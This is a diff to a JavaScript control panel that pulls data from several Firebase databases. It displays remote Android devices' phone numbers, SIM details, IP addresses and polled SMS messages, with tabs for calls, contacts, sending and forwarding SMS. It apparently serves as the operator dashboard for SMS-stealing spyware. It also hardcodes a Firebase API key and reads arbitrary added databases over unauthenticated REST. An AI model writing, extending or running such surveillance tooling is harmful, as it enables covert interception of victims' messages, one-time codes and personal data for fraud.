@@ -503,7 +503,7 @@ var allDevs=[], selDev='', activeListeners={};
 var firebaseInstances=[], firebaseConfigs=[];
 var panelInitialized=false;
 var clientsRawMap={}, tabLoaded={}, cacheWriteTimer=null;
-var CLIENTS_CACHE_KEY='rbl_clients_cache_v2';
+var CLIENTS_CACHE_KEY='rbl_clients_cache_v3';
 var FIREBASE_CFG_KEY='rbl_firebase_list';
 var CLIENTS_CACHE_TTL=6*60*60*1000;
 var fetchStartMs=0, firstFetchDone=false;
@@ -511,10 +511,17 @@ var activeFbId='';
 var ACTIVE_FB_KEY='rbl_active_fb';
 var SUMMARY_NODES=['devices_status','clients'];
 var DEVICE_NODES=['devices','users','clients_list','online_devices'];
-var SKIP_NODES=['config','settings','admin','rules','metadata','logs','test'];
+var SKIP_NODES=['config','settings','admin','rules','metadata','logs','test','user','users','messages','admin_pass','adminpass','passwords','webhook','webhooks','tokens','auth'];
 
+var PROTECTED_FB_IDS=['spinplay99','rabel_raand'];
 var DEFAULT_FIREBASES=[{
-  id:'spinplay99', name:'SpinPlay99',
+  id:'rabel_raand', name:'Rabel Raand', schema:'rabel',
+  apiKey:'',
+  authDomain:'rabel-raand.firebaseapp.com',
+  databaseURL:'https://rabel-raand-default-rtdb.firebaseio.com',
+  projectId:'rabel-raand'
+},{
+  id:'spinplay99', name:'SpinPlay99', schema:'spinplay',
   apiKey:'AIzaSyCsTa5oZOZ3XS7ZujbAl8JX1qPuUEP6P3I',
   authDomain:'spinplay99.firebaseapp.com',
   databaseURL:'https://spinplay99-default-rtdb.asia-southeast1.firebasedatabase.app',
@@ -532,34 +539,59 @@ function getFbInstance(fbId){for(var i=0;i<firebaseInstances.length;i++)if(fireb
 function getSelDev(){return allDevs.find(function(d){return d.id===selDev;})||null;}
 function restJson(url){return fetch(url,{cache:'no-store'}).then(function(r){return r.json();}).catch(function(){return null;});}
 function loadFirebaseConfigs(){
-  try{var s=localStorage.getItem(FIREBASE_CFG_KEY);if(s){var p=JSON.parse(s);if(Array.isArray(p)&&p.length)return p;}}catch(e){}
+  try{
+    var s=localStorage.getItem(FIREBASE_CFG_KEY);
+    if(s){
+      var p=JSON.parse(s);
+      if(Array.isArray(p)&&p.length){
+        DEFAULT_FIREBASES.forEach(function(def){
+          if(!p.some(function(c){return c.id===def.id||c.databaseURL===def.databaseURL;})) p.push(def);
+        });
+        p.forEach(function(c){
+          if(!c.schema) c.schema=(c.databaseURL||'').indexOf('rabel-raand')>=0?'rabel':'spinplay';
+        });
+        return p;
+      }
+    }
+  }catch(e){}
   return DEFAULT_FIREBASES.slice();
 }
 function saveFirebaseConfigs(){localStorage.setItem(FIREBASE_CFG_KEY,JSON.stringify(firebaseConfigs));}
+function getFbSchema(inst){
+  if(inst.config.schema) return inst.config.schema;
+  if(inst.restUrl.indexOf('rabel-raand')>=0) return 'rabel';
+  return 'spinplay';
+}
 function initFirebaseInstance(cfg){
   var appName='fb_'+cfg.id, db=null;
-  try{
-    var exists=false;
-    firebase.apps.forEach(function(a){if(a.name===appName)exists=true;});
-    if(!exists){
-      firebase.initializeApp({
-        apiKey:cfg.apiKey, authDomain:cfg.authDomain||'',
-        databaseURL:cfg.databaseURL, projectId:cfg.projectId||cfg.id,
-        storageBucket:cfg.storageBucket||'', messagingSenderId:cfg.messagingSenderId||'',
-        appId:cfg.appId||''
-      },appName);
-    }
-    db=firebase.app(appName).database();
-    db.ref('.info/connected').on('value',function(s){if(s.val())setStatus('connected','Connected ('+firebaseInstances.length+' FB)');});
-  }catch(e){console.error('FB init error',cfg.id,e);}
+  if(cfg.apiKey){
+    try{
+      var exists=false;
+      firebase.apps.forEach(function(a){if(a.name===appName)exists=true;});
+      if(!exists){
+        firebase.initializeApp({
+          apiKey:cfg.apiKey, authDomain:cfg.authDomain||'',
+          databaseURL:cfg.databaseURL, projectId:cfg.projectId||cfg.id,
+          storageBucket:cfg.storageBucket||'', messagingSenderId:cfg.messagingSenderId||'',
+          appId:cfg.appId||''
+        },appName);
+      }
+      db=firebase.app(appName).database();
+      db.ref('.info/connected').on('value',function(s){if(s.val())setStatus('connected','Connected ('+firebaseInstances.length+' FB)');});
+    }catch(e){console.error('FB init error',cfg.id,e);}
+  }
   var inst={id:cfg.id,name:cfg.name,config:cfg,appName:appName,db:db,
     restUrl:cfg.databaseURL.replace(/\/$/,''),discoveredNodes:[],liveAttached:false,deviceLiveAttached:{}};
+  inst.schema=getFbSchema(inst);
   firebaseInstances.push(inst);
   return inst;
 }
 function loadActiveFb(){
   try{activeFbId=localStorage.getItem(ACTIVE_FB_KEY)||'';}catch(e){activeFbId='';}
-  if(!activeFbId&&firebaseConfigs.length) activeFbId=firebaseConfigs[0].id;
+  if(!activeFbId&&firebaseConfigs.length){
+    var rabel=firebaseConfigs.find(function(c){return c.id==='rabel_raand';});
+    activeFbId=rabel?rabel.id:firebaseConfigs[0].id;
+  }
 }
 function initAllFirebase(){
   firebaseInstances=[];
@@ -592,12 +624,27 @@ function switchFirebase(fbId,silent){
     document.getElementById('deviceDetail').classList.add('hidden');
     document.getElementById('emptyState').classList.remove('hidden');
   }
+  loadFbCacheIntoMap(fbId);
+  processClientsData(getFbDataMap(),false);
   renderFirebaseSwitcher();
   updateSidebarTitle();
   renderSidebar();
   updateStats();
   applyFbTheme(fbId);
   if(!silent) showToast('success','Switched to '+getFbInstance(fbId).name);
+}
+function getFbDataMap(){
+  var out={};
+  Object.keys(clientsRawMap).forEach(function(k){
+    if(k.indexOf(activeFbId+'::')===0) out[k]=clientsRawMap[k];
+  });
+  return out;
+}
+function loadFbCacheIntoMap(fbId){
+  var cached=getClientsCacheData(fbId);
+  if(!cached) return;
+  Object.keys(clientsRawMap).forEach(function(k){if(k.indexOf(fbId+'::')===0)delete clientsRawMap[k];});
+  Object.keys(cached).forEach(function(k){clientsRawMap[k]=cached[k];});
 }
 function renderFirebaseSwitcher(){
   var html=firebaseConfigs.map(function(cfg){
@@ -628,7 +675,7 @@ function updateSidebarTitle(){
   if(el) el.textContent=inst?inst.name:'—';
 }
 function applyFbTheme(fbId){
-  var hues={'spinplay99':'255,60,60'};
+  var hues={'spinplay99':'255,60,60','rabel_raand':'123,47,255'};
   var h=hues[fbId]||String((fbId.charCodeAt(0)*17)%200+40)+',100,200';
   document.documentElement.style.setProperty('--glow','rgba('+h+',0.4)');
 }
@@ -669,14 +716,8 @@ function getClientsCacheMeta(){
   try{
     var raw=localStorage.getItem(CLIENTS_CACHE_KEY);
     if(!raw) return null;
-    var parsed=JSON.parse(raw);
-    if(!parsed||typeof parsed.ts!=='number'||!parsed.data) return null;
-    return parsed;
+    return JSON.parse(raw);
   }catch(e){ return null; }
-}
-
-function isClientsCacheValid(meta){
-  return meta&&(Date.now()-meta.ts)<CLIENTS_CACHE_TTL;
 }
 
 function clearClientsCache(){
@@ -687,51 +728,117 @@ function clearClientsCache(){
 
 function clearClientsCacheIfExpired(){
   var meta=getClientsCacheMeta();
-  if(meta&&!isClientsCacheValid(meta)){
-    clearClientsCache();
-    return true;
+  if(!meta||!meta.byFb) return false;
+  var changed=false;
+  Object.keys(meta.byFb).forEach(function(fbId){
+    if((Date.now()-meta.byFb[fbId].ts)>=CLIENTS_CACHE_TTL){delete meta.byFb[fbId];changed=true;}
+  });
+  if(changed){
+    if(Object.keys(meta.byFb).length) localStorage.setItem(CLIENTS_CACHE_KEY,JSON.stringify(meta));
+    else clearClientsCache();
   }
-  return false;
+  return changed;
 }
 
+function parseBattery(v){
+  if(v==null) return 0;
+  if(typeof v==='number') return v;
+  return parseInt(String(v).replace('%',''),10)||0;
+}
+function parseJoinedDate(str){
+  if(!str) return 0;
+  try{
+    var p=String(str).split('|')[0].trim().split('/');
+    if(p.length===3) return new Date(parseInt(p[2],10),parseInt(p[1],10)-1,parseInt(p[0],10)).getTime();
+  }catch(e){}
+  return 0;
+}
+function isValidDeviceRecord(raw){
+  if(!raw||typeof raw!=='object'||Array.isArray(raw)) return false;
+  if(raw.password||raw.Pass||raw.ExpDate||raw.expiry||raw.userName) return false;
+  if(raw.message&&raw.sender&&raw.dateTime) return false;
+  if(!raw.modelName&&!raw.deviceId&&!raw.device_model&&!raw.device_info&&!raw.live_data&&!raw.name) return false;
+  return true;
+}
+function normalizeClientRecord(raw){
+  if(!isValidDeviceRecord(raw)) return null;
+  if(raw.modelName||raw.deviceId||raw.mobNo){
+    return{
+      name:raw.modelName||'Unknown',
+      brand:raw.brand||(raw.modelName?String(raw.modelName).split(' ')[0]:''),
+      android:raw.androidV||raw.sdkV||'',
+      ts:parseJoinedDate(raw.joined)||raw.ts||0,
+      online:raw.status===true,
+      battery:parseBattery(raw.battery),
+      network:raw.service_provider||(raw.sims&&raw.sims[0]?raw.sims[0].carrierName:'')||'?',
+      charging:!!raw.charging,
+      sms_count:raw.sms_count||0,
+      mobNo:raw.mobNo||'',
+      ip:raw.ip_address||'',
+      storage:raw.storage||''
+    };
+  }
+  var r={
+    name:raw.name||raw.device_model||raw.model,
+    brand:raw.brand||raw.device_brand,
+    android:raw.android||raw.android_version,
+    ts:raw.ts||raw.last_seen||raw.timestamp||0,
+    online:raw.online, status:raw.status,
+    battery:parseBattery(raw.battery||raw.battery_level),
+    network:raw.network||raw.network_type,
+    charging:raw.charging||raw.is_charging,
+    sms_count:raw.sms_count||raw.smsCount||raw.total_sms
+  };
+  if(typeof r.ts==='object') r.ts=0;
+  if(r.online!==true&&r.status!=='online'){
+    var tsAge=(r.ts>0)?(Date.now()-r.ts):999999999;
+    if(tsAge>0&&tsAge<300000) r.online=true;
+  }
+  return r;
+}
 function slimClientEntry(s){
   if(!s||typeof s!=='object') return {};
-  var r={
-    name:s.name||s.device_model||s.model,
-    brand:s.brand||s.device_brand,
-    android:s.android||s.android_version,
-    ts:s.ts||s.last_seen||s.timestamp||0,
-    online:s.online, status:s.status,
-    battery:s.battery||s.battery_level,
-    network:s.network||s.network_type,
-    charging:s.charging||s.is_charging,
-    sms_count:s.sms_count||s.smsCount||s.total_sms
-  };
-  if(s._node) r._node=s._node;
-  if(s._fbId) r._fbId=s._fbId;
-  return r;
+  var n=normalizeClientRecord(s)||{};
+  if(s._node) n._node=s._node;
+  if(s._fbId) n._fbId=s._fbId;
+  return n;
 }
 function slimClientsRaw(raw){
   var slim={};
   Object.keys(raw||{}).forEach(function(k){slim[k]=slimClientEntry(raw[k]);});
   return slim;
 }
-function setClientsCache(raw){
-  if(!raw) return;
+function setClientsCacheForFb(fbId){
+  if(!fbId) return;
+  var slice={};
+  Object.keys(clientsRawMap).forEach(function(k){
+    if(k.indexOf(fbId+'::')===0) slice[k]=slimClientEntry(clientsRawMap[k]);
+  });
+  if(!Object.keys(slice).length) return;
   try{
-    localStorage.setItem(CLIENTS_CACHE_KEY,JSON.stringify({ts:Date.now(),data:slimClientsRaw(raw)}));
-    updateCacheBadge(false);
+    var meta=getClientsCacheMeta()||{byFb:{}};
+    if(!meta.byFb) meta.byFb={};
+    meta.byFb[fbId]={ts:Date.now(),data:slice};
+    localStorage.setItem(CLIENTS_CACHE_KEY,JSON.stringify(meta));
+    if(fbId===activeFbId) updateCacheBadge(false);
   }catch(e){ console.warn('Clients cache write failed:',e); }
 }
-function debouncedSetClientsCache(raw){
+function debouncedSetClientsCache(fbId){
   clearTimeout(cacheWriteTimer);
-  cacheWriteTimer=setTimeout(function(){setClientsCache(raw);},400);
+  var fid=fbId||activeFbId;
+  cacheWriteTimer=setTimeout(function(){if(fid)setClientsCacheForFb(fid);},400);
+}
+function applyFbData(inst){
+  if(inst&&inst.id===activeFbId) processClientsData(getFbDataMap(),false);
+  debouncedSetClientsCache(inst?inst.id:activeFbId);
 }
 
-function getClientsCacheData(){
+function getClientsCacheData(fbId){
   var meta=getClientsCacheMeta();
-  if(!isClientsCacheValid(meta)) return null;
-  return meta.data;
+  if(!meta||!meta.byFb||!meta.byFb[fbId]) return null;
+  var entry=meta.byFb[fbId];
+  if(!entry.data||(Date.now()-entry.ts)>=CLIENTS_CACHE_TTL) return null;
+  return entry.data;
 }
 
 function updateCacheBadge(fromCache){
@@ -739,8 +846,9 @@ function updateCacheBadge(fromCache){
   if(!badge) return;
   if(fromCache){
     var meta=getClientsCacheMeta();
-    if(!meta) return;
-    var ageMin=Math.floor((Date.now()-meta.ts)/60000);
+    var entry=meta&&meta.byFb&&activeFbId?meta.byFb[activeFbId]:null;
+    if(!entry) return;
+    var ageMin=Math.floor((Date.now()-entry.ts)/60000);
     badge.textContent='CACHED · '+ageMin+'m ago';
     badge.classList.remove('hidden');
   } else {
@@ -761,10 +869,10 @@ function openPanel(){
   clearClientsCacheIfExpired();
   fetchStartMs=performance.now();
   firstFetchDone=false;
-  var cached=getClientsCacheData();
-  if(cached){
-    clientsRawMap=cached;
-    processClientsData(cached,true);
+  loadFbCacheIntoMap(activeFbId);
+  var cached=getClientsCacheData(activeFbId);
+  if(cached&&Object.keys(cached).length){
+    processClientsData(getFbDataMap(),true);
     updateCacheBadge(true);
     showFetchMs(0);
   }
@@ -780,10 +888,11 @@ function markFetchDone(){
   showFetchMs(Math.round(performance.now()-fetchStartMs));
 }
 function ingestDeviceData(fbId,nodeName,devId,data){
+  var norm=normalizeClientRecord(data);
+  if(!norm) return;
   var key=makeDevKey(fbId,devId);
-  var entry=slimClientEntry(data);
-  entry._node=nodeName; entry._fbId=fbId;
-  clientsRawMap[key]=Object.assign({},clientsRawMap[key]||{},entry);
+  norm._node=nodeName; norm._fbId=fbId;
+  clientsRawMap[key]=Object.assign({},clientsRawMap[key]||{},norm);
 }
 function mergeSummaryNode(fbId,nodeName,raw){
   if(!raw||typeof raw!=='object') return;
@@ -804,10 +913,6 @@ function summaryFromParts(id,info,live,online){
     network:live.network_type||live.network||'?', charging:!!live.is_charging,
     sms_count:live.total_sms||live.sms_count||0
   }};
-}
-function looksLikeDevice(o){
-  if(!o||typeof o!=='object') return false;
-  return !!(o.device_info||o.live_data||o.device_model||o.name||o.battery_level!=null||o.battery!=null||o.online!=null);
 }
 function fetchOneDeviceSummary(inst,nodeName,id){
   var base=inst.restUrl+'/'+nodeName+'/'+encodeURIComponent(id)+'/';
@@ -837,8 +942,8 @@ function fetchDevicesCollection(inst,nodeName){
           if(row&&row.id) ingestDeviceData(inst.id,nodeName,row.id,row.data);
         });
         markFetchDone();
-        processClientsData(clientsRawMap,false);
-        debouncedSetClientsCache(clientsRawMap);
+        if(inst.id===activeFbId) processClientsData(getFbDataMap(),false);
+        debouncedSetClientsCache(inst.id);
         return nextBatch();
       });
     }
@@ -849,45 +954,41 @@ function fetchSummaryNode(inst,nodeName){
   return restJson(inst.restUrl+'/'+nodeName+'.json').then(function(raw){
     mergeSummaryNode(inst.id,nodeName,raw);
     markFetchDone();
-    processClientsData(clientsRawMap,false);
-    debouncedSetClientsCache(clientsRawMap);
-  });
-}
-function probeNode(inst,nodeName){
-  if(SKIP_NODES.indexOf(nodeName)>=0) return Promise.resolve();
-  return restJson(inst.restUrl+'/'+nodeName+'.json?shallow=true').then(function(shallow){
-    if(!shallow||typeof shallow!=='object') return;
-    var keys=Object.keys(shallow);
-    if(!keys.length) return;
-    return restJson(inst.restUrl+'/'+nodeName+'/'+encodeURIComponent(keys[0])+'.json').then(function(sample){
-      if(!sample) return;
-      if(sample.device_info||sample.live_data) return fetchDevicesCollection(inst,nodeName);
-      if(looksLikeDevice(sample)||typeof sample==='object'){
-        return restJson(inst.restUrl+'/'+nodeName+'.json').then(function(full){
-          mergeSummaryNode(inst.id,nodeName,full);
-          markFetchDone(); processClientsData(clientsRawMap,false);
-          debouncedSetClientsCache(clientsRawMap);
-        });
-      }
-    });
+    applyFbData(inst);
   });
 }
 function discoverAndFetchInstance(inst){
   return restJson(inst.restUrl+'/.json?shallow=true').then(function(roots){
     if(!roots||typeof roots!=='object'){inst.discoveredNodes=[];return;}
-    inst.discoveredNodes=Object.keys(roots);
+    inst.discoveredNodes=Object.keys(roots).filter(function(n){return SKIP_NODES.indexOf(n)<0;});
     var tasks=[];
     inst.discoveredNodes.forEach(function(node){
       if(SUMMARY_NODES.indexOf(node)>=0) tasks.push(fetchSummaryNode(inst,node));
       else if(node==='devices'||DEVICE_NODES.indexOf(node)>=0) tasks.push(fetchDevicesCollection(inst,node));
-      else tasks.push(probeNode(inst,node));
     });
     return Promise.all(tasks);
   });
 }
+function attachRestPolling(inst){
+  if(inst.pollTimer||inst.db) return;
+  function poll(){
+    restJson(inst.restUrl+'/clients.json').then(function(raw){
+      if(!raw) return;
+      mergeSummaryNode(inst.id,'clients',raw);
+      applyFbData(inst);
+    });
+  }
+  poll();
+  inst.pollTimer=setInterval(poll,12000);
+}
 function fetchAllFirebaseData(){
   if(!firebaseInstances.length){initAllFirebase();}
-  firebaseInstances.forEach(function(inst){discoverAndFetchInstance(inst); attachClientsLiveUpdates(inst);});
+  try{localStorage.removeItem('rbl_clients_cache_v2');}catch(e){}
+  firebaseInstances.forEach(function(inst){
+    discoverAndFetchInstance(inst);
+    attachClientsLiveUpdates(inst);
+    attachRestPolling(inst);
+  });
 }
 function refreshAllFirebase(){
   clientsRawMap={}; firstFetchDone=false; fetchStartMs=performance.now();
@@ -906,8 +1007,7 @@ function attachDeviceLiveListeners(inst,nodeName,ids){
       inst.db.ref(nodeName+'/'+id+'/device_info').once('value').then(function(si){
         var row=summaryFromParts(id,si.val(),s.val(),null);
         ingestDeviceData(inst.id,nodeName,id,row.data);
-        processClientsData(clientsRawMap,false);
-        debouncedSetClientsCache(clientsRawMap);
+        applyFbData(inst);
       });
     });
   });
@@ -915,15 +1015,14 @@ function attachDeviceLiveListeners(inst,nodeName,ids){
 function attachClientsLiveUpdates(inst){
   if(!inst.db||inst.liveAttached) return;
   inst.liveAttached=true;
-  var apply=function(){processClientsData(clientsRawMap,false);debouncedSetClientsCache(clientsRawMap);};
   inst.db.ref('devices_status').on('value',function(s){
     if(!s.exists()) return;
-    mergeSummaryNode(inst.id,'devices_status',s.val()); apply();
+    mergeSummaryNode(inst.id,'devices_status',s.val()); applyFbData(inst);
   });
   ['clients'].forEach(function(node){
-    inst.db.ref(node).on('child_added',function(s){ingestDeviceData(inst.id,node,s.key,s.val());apply();});
-    inst.db.ref(node).on('child_changed',function(s){ingestDeviceData(inst.id,node,s.key,s.val());apply();});
-    inst.db.ref(node).on('child_removed',function(s){delete clientsRawMap[makeDevKey(inst.id,s.key)];apply();});
+    inst.db.ref(node).on('child_added',function(s){ingestDeviceData(inst.id,node,s.key,s.val());applyFbData(inst);});
+    inst.db.ref(node).on('child_changed',function(s){ingestDeviceData(inst.id,node,s.key,s.val());applyFbData(inst);});
+    inst.db.ref(node).on('child_removed',function(s){delete clientsRawMap[makeDevKey(inst.id,s.key)];applyFbData(inst);});
   });
 }
 function mergeClientMaps(a,b){
@@ -1060,9 +1159,39 @@ function updateHero(d){
 function clearDeviceListeners(){
   Object.keys(activeListeners).forEach(function(k){
     var L=activeListeners[k];
-    if(L&&L.db&&L.handler) L.db.ref(L.path).off('value',L.handler);
+    if(L&&L.type==='rest'&&L.timer) clearInterval(L.timer);
+    else if(L&&L.db&&L.handler) L.db.ref(L.path).off('value',L.handler);
   });
   activeListeners={};
+}
+function restPoll(fbId,path,cb){
+  var inst=getFbInstance(fbId);
+  if(!inst) return;
+  function tick(){restJson(inst.restUrl+'/'+path+'.json').then(function(d){cb(d);});}
+  tick();
+  activeListeners[fbId+'::rest::'+path]={type:'rest',timer:setInterval(tick,12000)};
+}
+function loadRabelSms(dev){
+  restPoll(dev.fbId,'messages/'+dev.rawId,function(data){
+    var msgs=[];
+    if(data&&typeof data==='object') Object.keys(data).forEach(function(k){
+      var m=data[k]; if(!m||typeof m!=='object'||!m.message) return;
+      msgs.push({address:m.sender||'?',body:m.message,date_readable:m.dateTime||'—',type:(m.type||'incoming').toLowerCase()});
+    });
+    window._allSmsData=msgs; window._newSmsData=[]; window._allSmsTotal=msgs.length;
+    renderSmsList();
+  });
+}
+function loadRabelSim(dev){
+  restPoll(dev.fbId,'clients/'+dev.rawId,function(data){
+    var g=document.getElementById('simGrid');
+    if(!data){g.innerHTML='<div style="color:var(--muted);font-family:Space Mono,monospace;font-size:10px">No device info</div>';return;}
+    var fields=[['📱 Model',data.modelName],['📞 Mobile',data.mobNo],['🔋 Battery',data.battery],['📶 Network',data.service_provider],['💾 Storage',data.storage],['🌐 IP',data.ip_address],['🤖 Android',data.androidV]];
+    if(data.sims&&data.sims.length) data.sims.forEach(function(sim,i){fields.push(['SIM '+(i+1),sim.carrierName+' · '+sim.phoneNumber]);});
+    g.innerHTML='<div class="sim-card">'+fields.map(function(f){
+      return '<div class="sim-row"><span class="sim-key">'+f[0]+'</span><span class="sim-val">'+(f[1]?esc(String(f[1])):'<span style="color:var(--muted)">N/A</span>')+'</span></div>';
+    }).join('')+'</div>';
+  });
 }
 function devOn(fbId,path,cb){
   var inst=getFbInstance(fbId);
@@ -1079,6 +1208,16 @@ function ensureTabLoaded(tab){
   tabLoaded[tab]=true;
   var dev=getSelDev();
   if(!dev) return;
+  var inst=getFbInstance(dev.fbId);
+  if(inst&&inst.schema==='rabel'){
+    if(tab==='sms'){loadRabelSms(dev);return;}
+    if(tab==='sim'){loadRabelSim(dev);return;}
+    if(tab==='calls'||tab==='contacts'||tab==='perms'||tab==='sendsms'||tab==='forward'){
+      var tb=document.getElementById(tab==='calls'?'callsTbody':tab==='contacts'?'contactsTbody':'');
+      if(tb) tb.innerHTML='<tr><td colspan="6" class="tbl-empty">Not available for this Firebase schema</td></tr>';
+      return;
+    }
+  }
   var ref=dev.deviceNode+'/'+dev.rawId;
   if(tab==='sms'){
     devOn(dev.fbId,ref+'/new_sms',function(snap){
@@ -1263,7 +1402,7 @@ function renderFirebaseList(){
     return '<div class="fb-item"><div><div class="fb-item-name">'+esc(cfg.name)+'</div>'+
       '<div class="fb-item-url">'+esc(cfg.databaseURL)+'</div>'+
       '<div class="fb-item-nodes">📂 Nodes: '+esc(nodes)+'</div></div>'+
-      (cfg.id!=='spinplay99'?'<button class="fb-del" onclick="removeFirebaseProject(\''+cfg.id+'\')">✕</button>':'')+
+      (PROTECTED_FB_IDS.indexOf(cfg.id)<0?'<button class="fb-del" onclick="removeFirebaseProject(\''+cfg.id+'\')">✕</button>':'')+
       '</div>';
   }).join('');
   var c=document.getElementById('fbCount');if(c)c.textContent=firebaseConfigs.length;
@@ -1275,11 +1414,13 @@ function addFirebaseProject(){
   var auth=document.getElementById('fbAuth').value.trim();
   var project=document.getElementById('fbProject').value.trim();
   var status=document.getElementById('fbAddStatus');
-  if(!name||!url||!apiKey){status.innerHTML='<span style="color:var(--error)">Name, Database URL & API Key required</span>';return;}
+  var schema=url.indexOf('rabel-raand')>=0?'rabel':'spinplay';
+  if(!name||!url){status.innerHTML='<span style="color:var(--error)">Name & Database URL required</span>';return;}
+  if(schema!=='rabel'&&!apiKey){status.innerHTML='<span style="color:var(--error)">API Key required for this Firebase</span>';return;}
   status.textContent='Testing connection...';
   restJson(url+'/.json?shallow=true').then(function(roots){
     var id=project||name.toLowerCase().replace(/[^a-z0-9]+/g,'_').slice(0,24)+'_'+Date.now().toString(36);
-    var cfg={id:id,name:name,databaseURL:url,apiKey:apiKey,authDomain:auth,projectId:project||id};
+    var cfg={id:id,name:name,databaseURL:url,apiKey:apiKey||'',authDomain:auth,projectId:project||id,schema:schema};
     if(firebaseConfigs.some(function(c){return c.databaseURL===url;})){
       status.innerHTML='<span style="color:var(--error)">This Firebase already added</span>';return;
     }
@@ -1287,11 +1428,12 @@ function addFirebaseProject(){
     saveFirebaseConfigs();
     initFirebaseInstance(cfg);
     var inst=getFbInstance(cfg.id);
-    var nodes=roots&&typeof roots==='object'?Object.keys(roots):[];
+    var nodes=roots&&typeof roots==='object'?Object.keys(roots).filter(function(n){return SKIP_NODES.indexOf(n)<0;}):[];
     inst.discoveredNodes=nodes;
     renderFirebaseList();
     discoverAndFetchInstance(inst);
     attachClientsLiveUpdates(inst);
+    attachRestPolling(inst);
     switchFirebase(cfg.id,true);
     document.getElementById('fbName').value='';
     document.getElementById('fbUrl').value='';
@@ -1310,9 +1452,9 @@ function removeFirebaseProject(id){
   saveFirebaseConfigs();
   Object.keys(clientsRawMap).forEach(function(k){if(k.indexOf(id+'::')===0)delete clientsRawMap[k];});
   initAllFirebase();
-  processClientsData(clientsRawMap,false);
+  processClientsData(getFbDataMap(),false);
   renderFirebaseList();
-  if(panelInitialized){fetchAllFirebaseData();switchFirebase(activeFbId);}
+  if(panelInitialized){fetchAllFirebaseData();switchFirebase(activeFbId,true);}
   showToast('success','Firebase removed');
 }
 
